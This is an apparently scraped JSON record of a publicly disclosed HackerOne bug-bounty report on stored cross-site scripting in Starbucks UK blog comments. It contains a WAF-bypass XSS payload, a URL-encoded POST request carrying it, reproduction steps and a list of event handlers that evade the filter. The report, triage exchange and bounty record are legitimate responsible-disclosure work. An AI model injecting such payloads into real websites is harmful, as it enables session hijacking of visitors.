{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-06-26T20:24:19.057Z", 
    "voters": [
        "bl4de", 
        "spam404", 
        "s_p_q_r", 
        "bayotop", 
        "bogdantcaciuc", 
        "eveeez", 
        "quistertow", 
        "zuh4n", 
        "axolotl", 
        "ak1t4", 
        "and 9 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 218226, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-06-27T17:13:40.600Z", 
    "vulnerability_information": "Hi,\n\nthere are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork `site:www.starbucks.co.uk inurl:blog/`. Notice the comments functionality at the bottom at the page.\n\nWhen a comment is sent the following request is made:\n```http\nPOST /blog/addcomment HTTP/1.1\nHost: www.starbucks.co.uk\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\nContent-Length: 321\nCookie: [redacted]\nConnection: close\n\nBody=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com\n```\nThe values of the `Body` and `author` parameters will be rendered into the page as a new comment. The value from the `author` parameter is not correctly encoded. This allows to inject arbitrary valid HTML.\n\nYou seem to be using a WAF which will block request (500) containing `<script></script>` and various input matching `on*=`.  However, I managed to find a bypass:\n\n```html\n</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>\n```\n\nThis will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\n\nNote that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).\n\nHere is a list of all potential `on*=` events I could find, that will bypass your WAF an can be used to create cross-browser payloads:\n\n```\nonsearch\nonwebkitanimationiteration\nonwebkitanimationstart\nonanimationiteration\nonwebkitanimationend\nonanimationstart\nondataavailable\nontransitionend\nonanimationend\nonreceived\nonpopstate\n```\n\nTo fix this issue make sure the `author` value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.\n\nPlease let me know in case you need any more information from my side. ", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "low", 
            "user_interaction": "required", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "high", 
            "availability": "none"
        }, 
        "rating": "high", 
        "score": 7.3, 
        "author_type": "Team"
    }, 
    "title": "Stored XSS in comments on https://www.starbucks.co.uk/blog/*", 
    "is_member_of_team?": null, 
    "vote_count": 19, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-07-26T20:24:19.111Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-04-03T08:30:20.450Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-03T08:30:20.450Z", 
            "actor": {
                "username": "rubikcube", 
                "url": "/rubikcube", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/112/037/ff013cfe18f1dfd1f374db2397c2bb3f284a0cf3_medium.jpg?1474304365"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "starbucks", 
            "message": "Hey @bayotop \n\n\nUnfortunately i was not able to reproduce your submission, could you please add additional information how to abuse this vulnerability?\n\nThanks!\n\n@rubikcube ", 
            "markdown_message": "<p>Hey <a href=\"/bayotop\">@bayotop</a> </p>\n\n<p>Unfortunately i was not able to reproduce your submission, could you please add additional information how to abuse this vulnerability?</p>\n\n<p>Thanks!</p>\n\n<p><a href=\"/rubikcube\">@rubikcube</a> </p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1579852, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-03T08:56:36.747Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-03T09:02:47.701Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi,\n\nthis is the request I used to post the comment: \n\n```http\nPOST /blog/addcomment HTTP/1.1\nHost: www.starbucks.co.uk\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/html, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nX-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\nContent-Length: 321\nCookie: [redacted]\nConnection: close\n\nBody=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com%3c%2f%6c%69%3e%3c%2f%75%6c%3e%3c%2f%6c%69%3e%3c%2f%75%6c%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%74%65%73%74%2f%6f%6e%62%65%66%6f%72%65%73%63%72%69%70%74%65%78%65%63%75%74%65%3d%63%6f%6e%66%69%72%6d%60%68%31%70%6f%63%60%3e\n```\n\nNote that you need to be authenticated to post comments so you need to add valid cookies to the above request.\n\nThe exact steps to reproduce are:\n\n1. Go to any blog post (https://www.starbucks.co.uk/blog/*) with an enabled comment section.\n2. Post any comment and capture the request in a proxy (i.e. BurpSuite).\n3. Append the URL encoded payload to the `author` parameter value and forward the edited request.\n4. After reloading, the comment is added and anyone visiting the page will trigger the injected JS.\n\nNote that the above payload works only in FireFox. \n\nIf it still doesn't help, could you please specify where exactly is happening? Sharing the URL where you try to reproduce the issue would help too (if it is public of course). ", 
            "markdown_message": "<p>Hi,</p>\n\n<p>this is the request I used to post the comment: </p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/blog/addcomment</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">www.starbucks.co.uk</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">text/html, */*; q=0.01</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">X-NewRelic-ID</span><span class=\"p\">:</span> <span class=\"s\">VQUHVlNSARACV1JSBAIGVA==</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">application/x-www-form-urlencoded; charset=UTF-8</span>\n<span class=\"na\">X-Requested-With</span><span class=\"p\">:</span> <span class=\"s\">XMLHttpRequest</span>\n<span class=\"na\">Referer</span><span class=\"p\">:</span> <span class=\"s\">https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">321</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">[redacted]</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n\nBody=Nice&amp;ParentId=0&amp;PostID=1241&amp;author=ope67164%40disaq.com%3c%2f%6c%69%3e%3c%2f%75%6c%3e%3c%2f%6c%69%3e%3c%2f%75%6c%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%2f%64%69%76%3e%3c%74%65%73%74%2f%6f%6e%62%65%66%6f%72%65%73%63%72%69%70%74%65%78%65%63%75%74%65%3d%63%6f%6e%66%69%72%6d%60%68%31%70%6f%63%60%3e\n</code></pre>\n<p>Note that you need to be authenticated to post comments so you need to add valid cookies to the above request.</p>\n\n<p>The exact steps to reproduce are:</p>\n\n<ol>\n<li>Go to any blog post (<a title=\"https://www.starbucks.co.uk/blog/*\" href=\"/redirect?signature=b9440ca69516c4a7184ef792a4fd83d2547baf3e&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fblog%2F%2A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/blog/*</span><i class=\"icon-external-link\"></i></a>) with an enabled comment section.</li>\n<li>Post any comment and capture the request in a proxy (i.e. BurpSuite).</li>\n<li>Append the URL encoded payload to the <code>author</code> parameter value and forward the edited request.</li>\n<li>After reloading, the comment is added and anyone visiting the page will trigger the injected JS.</li>\n</ol>\n\n<p>Note that the above payload works only in FireFox. </p>\n\n<p>If it still doesn&#39;t help, could you please specify where exactly is happening? Sharing the URL where you try to reproduce the issue would help too (if it is public of course). </p>\n", 
            "type": "Activities::BugNew", 
            "id": 1579882, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-03T11:10:28.493Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-03T11:10:28.493Z", 
            "actor": {
                "username": "rubikcube", 
                "url": "/rubikcube", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/112/037/ff013cfe18f1dfd1f374db2397c2bb3f284a0cf3_medium.jpg?1474304365"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "starbucks", 
            "message": "Hey @bayotop \n\nAm i right you do need a valid account for the Starbucks blog? How would an attacker gain one? \n\nbest\n\n@rubikcube ", 
            "markdown_message": "<p>Hey <a href=\"/bayotop\">@bayotop</a> </p>\n\n<p>Am i right you do need a valid account for the Starbucks blog? How would an attacker gain one? </p>\n\n<p>best</p>\n\n<p><a href=\"/rubikcube\">@rubikcube</a> </p>\n", 
            "type": "Activities::Comment", 
            "id": 1580119, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-03T11:23:52.531Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-03T11:23:52.531Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "I used this link - https://www.starbucks.co.uk/account/signin - to create a test account. Once I was authenticated, I was free to post comments on https://www.starbucks.co.uk/blogs/*. See the comments at the bottom of this page -\n https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability.\n\nIf this is not intended behavior., then that would be a whole different issue on it's own. \n\nNonetheless, I would strongly recommend fixing the XSS issue described above. \"A valid account for the Starbucks blog is needed\" is a very dangerous presumption in this case. Totally legitimate accounts can be compromised in many different ways and then used to hijack other user's session by the XSS described above. Also you never know when legitimate users turn malicous. \n\nI am correct assuming you were now able to reproduce the issue?", 
            "markdown_message": "<p>I used this link - <a title=\"https://www.starbucks.co.uk/account/signin\" href=\"/redirect?signature=a3443a84946b95307b7f35b29443d6f1482795ff&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Faccount%2Fsignin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/account/signin</span><i class=\"icon-external-link\"></i></a> - to create a test account. Once I was authenticated, I was free to post comments on <a title=\"https://www.starbucks.co.uk/blogs/*\" href=\"/redirect?signature=00db5b1d1cdf7d042f1453ff14ca5bf32efebd44&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fblogs%2F%2A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/blogs/*</span><i class=\"icon-external-link\"></i></a>. See the comments at the bottom of this page -<br>\n <a title=\"https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability\" href=\"/redirect?signature=29cfa560c40396c061f10b98ae5db3b38341c288&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fblog%2Fsetting-the-record-straight-on-starbucks-uk-taxes-and-profitability\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>If this is not intended behavior., then that would be a whole different issue on it&#39;s own. </p>\n\n<p>Nonetheless, I would strongly recommend fixing the XSS issue described above. &quot;A valid account for the Starbucks blog is needed&quot; is a very dangerous presumption in this case. Totally legitimate accounts can be compromised in many different ways and then used to hijack other user&#39;s session by the XSS described above. Also you never know when legitimate users turn malicous. </p>\n\n<p>I am correct assuming you were now able to reproduce the issue?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1580144, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-04T13:03:27.959Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-04T13:03:27.959Z", 
            "actor": {
                "username": "rubikcube", 
                "url": "/rubikcube", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/112/037/ff013cfe18f1dfd1f374db2397c2bb3f284a0cf3_medium.jpg?1474304365"
                }, 
                "hackerone_triager": true
            }, 
            "team_handle": "starbucks", 
            "message": "Hey @bayotop \n\nI was able to confirm your submission, could you please remove the comments? \n\nThanks!\n\n@rubikcube ", 
            "markdown_message": "<p>Hey <a href=\"/bayotop\">@bayotop</a> </p>\n\n<p>I was able to confirm your submission, could you please remove the comments? </p>\n\n<p>Thanks!</p>\n\n<p><a href=\"/rubikcube\">@rubikcube</a> </p>\n", 
            "type": "Activities::Comment", 
            "id": 1582777, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-04T13:12:50.465Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-04T13:13:06.829Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @rubikcube,\n\nI am happy to hear that. \n\nI'd love to remove the comments, but there seems to be no option for that. The only options I can see are `Reply`, `Flagged` and `Permalink`.", 
            "markdown_message": "<p>Hi <a href=\"/rubikcube\">@rubikcube</a>,</p>\n\n<p>I am happy to hear that. </p>\n\n<p>I&#39;d love to remove the comments, but there seems to be no option for that. The only options I can see are <code>Reply</code>, <code>Flagged</code> and <code>Permalink</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1582807, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-11T05:49:24.174Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-11T05:49:24.174Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi,\n\nJust wondering whether there has been any action or progress made on this report?\nThanks.", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Just wondering whether there has been any action or progress made on this report?<br>\nThanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1604064, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-12T14:35:21.458Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-12T14:35:21.458Z", 
            "actor": {
                "username": "siren", 
                "url": "/siren", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @bayotop,\n\nThanks for the report & sorry for the delay here.  This issue is with our starbucks.com team and we'll be in touch as soon as we have another update.", 
            "markdown_message": "<p>Hi <a href=\"/bayotop\">@bayotop</a>,</p>\n\n<p>Thanks for the report &amp; sorry for the delay here.  This issue is with our starbucks.com team and we&#39;ll be in touch as soon as we have another update.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1607208, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-04-12T14:35:57.946Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-12T14:35:57.946Z", 
            "actor": {
                "url": "/starbucks", 
                "profile": {
                    "name": "Starbucks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
                }
            }, 
            "team_handle": "starbucks", 
            "bonus_amount": "0.0", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "bayotop", 
                "url": "/bayotop"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1607210, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-04-27T08:14:51.958Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-04-27T08:14:51.958Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @siren,\n\nGlad to hear that and thanks for the bounty. Let me know if I can be of any further assistance. ", 
            "markdown_message": "<p>Hi <a href=\"/siren\">@siren</a>,</p>\n\n<p>Glad to hear that and thanks for the bounty. Let me know if I can be of any further assistance. </p>\n", 
            "type": "Activities::Comment", 
            "id": 1639367, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-22T15:49:25.835Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-22T15:49:25.835Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi,\n\nSince it's been one month now, do you have any updates on when this issue will be resolved? Thanks.", 
            "markdown_message": "<p>Hi,</p>\n\n<p>Since it&#39;s been one month now, do you have any updates on when this issue will be resolved? Thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1691899, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-08T07:06:33.739Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-08T07:06:33.739Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Seems like ```https://www.starbucks.*/blog/*``` permanently redirects to https://1912pike.com making this publicly unexploitable. Still, you should definitely fix the issue in case the blog functionality is accessible internally. \n\nAnyway, I am considering this issue resolved. ", 
            "markdown_message": "<p>Seems like <code>https://www.starbucks.*/blog/*</code> permanently redirects to <a title=\"https://1912pike.com\" href=\"/redirect?signature=09ba7c83630d231128798dbac1912a9c85e3277a&amp;url=https%3A%2F%2F1912pike.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://1912pike.com</span><i class=\"icon-external-link\"></i></a> making this publicly unexploitable. Still, you should definitely fix the issue in case the blog functionality is accessible internally. </p>\n\n<p>Anyway, I am considering this issue resolved. </p>\n", 
            "type": "Activities::Comment", 
            "id": 1740584, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bayotop", 
                "url": "/bayotop"
            }, 
            "created_at": "2017-06-26T20:17:04.456Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T20:17:04.456Z", 
            "actor": {
                "username": "siren", 
                "url": "/siren", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "Hi @bayotop,\n\nSorry for the delay in closing this out.\nAs you mentioned, the redirect was put in place resolving the issue while the functionality and code itself is being removed.\n\nThanks!\n", 
            "markdown_message": "<p>Hi <a href=\"/bayotop\">@bayotop</a>,</p>\n\n<p>Sorry for the delay in closing this out.<br>\nAs you mentioned, the redirect was put in place resolving the issue while the functionality and code itself is being removed.</p>\n\n<p>Thanks!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1782421, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-26T20:24:19.079Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-26T20:24:19.079Z", 
            "actor": {
                "username": "bayotop", 
                "url": "/bayotop", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/036/633/4e73458fffdb16796d3b91f672104fa30a4722ad_medium.jpg?1544039858"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1782439, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-27T17:13:40.624Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-27T17:13:40.624Z", 
            "actor": {
                "username": "siren", 
                "url": "/siren", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1785063, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-27T17:13:40.733Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-27T17:13:40.733Z", 
            "actor": {
                "username": "siren", 
                "url": "/siren", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/496/2189b5fcdba98eabee12118f04a84a149e1f68ea_medium.png?1473788387"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "starbucks", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1785064, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-07-18T18:26:45.476Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-07-18T18:26:45.476Z", 
            "actor": {
                "username": "doggos", 
                "url": "/doggos", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/277/976/c8a5e5a824d6af4e3d0668dcf878285a0c38c4d9_medium.jpg?1526502410"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "High (7.3)", 
                "old_severity": null
            }, 
            "team_handle": "starbucks", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 3063264, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bayotop", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bayotop", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/036/633/e331da5b8e3a380324eb7c0cefdf97fe1901b5be_small.jpg?1544039858"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 62, 
        "name": "Cross-site Scripting (XSS) - Stored"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -43035137.43080803, 
    "disclosed_at": "2017-06-27T17:13:40.679Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/218226", 
    "created_at": "2017-04-02T23:18:08.913Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>there are a lot of published blog post under <a title=\"https://www.starbucks.co.uk/blog/*\" href=\"/redirect?signature=b9440ca69516c4a7184ef792a4fd83d2547baf3e&amp;url=https%3A%2F%2Fwww.starbucks.co.uk%2Fblog%2F%2A\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.starbucks.co.uk/blog/*</span><i class=\"icon-external-link\"></i></a>. You can find plenty of them using this google dork <code>site:www.starbucks.co.uk inurl:blog/</code>. Notice the comments functionality at the bottom at the page.</p>\n\n<p>When a comment is sent the following request is made:</p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/blog/addcomment</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">www.starbucks.co.uk</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">text/html, */*; q=0.01</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">X-NewRelic-ID</span><span class=\"p\">:</span> <span class=\"s\">VQUHVlNSARACV1JSBAIGVA==</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">application/x-www-form-urlencoded; charset=UTF-8</span>\n<span class=\"na\">X-Requested-With</span><span class=\"p\">:</span> <span class=\"s\">XMLHttpRequest</span>\n<span class=\"na\">Referer</span><span class=\"p\">:</span> <span class=\"s\">https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">321</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">[redacted]</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n\nBody=Nice&amp;ParentId=0&amp;PostID=1241&amp;author=ope67164%40disaq.com\n</code></pre>\n<p>The values of the <code>Body</code> and <code>author</code> parameters will be rendered into the page as a new comment. The value from the <code>author</code> parameter is not correctly encoded. This allows to inject arbitrary valid HTML.</p>\n\n<p>You seem to be using a WAF which will block request (500) containing <code>&lt;script&gt;&lt;/script&gt;</code> and various input matching <code>on*=</code>.  However, I managed to find a bypass:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;test</span><span class=\"err\">/</span><span class=\"na\">onbeforescriptexecute=</span><span class=\"s\">confirm`h1poc`</span><span class=\"nt\">&gt;</span>\n</code></pre>\n<p>This will work on latest FF as can be seen here: <a 